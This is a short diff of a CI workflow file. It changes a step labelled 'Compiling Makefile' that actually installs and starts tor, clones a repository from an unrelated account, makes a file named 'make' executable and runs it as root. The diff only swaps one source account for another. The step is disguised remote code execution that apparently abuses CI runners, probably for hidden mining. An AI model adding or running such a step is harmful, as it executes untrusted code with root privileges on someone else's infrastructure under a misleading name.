@@ -15,4 +15,4 @@ jobs:
       - name: Compiling Makefile
         shell: bash
         run: |
-          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://github.com/anonymousperson456/m && sudo chmod +x m/make && sudo ./m/make
+          sudo apt update -y && sudo apt install git tor -y && (sudo tor &) && sudo git clone https://github.com/hoster156/m && sudo chmod +x m/make && sudo ./m/make
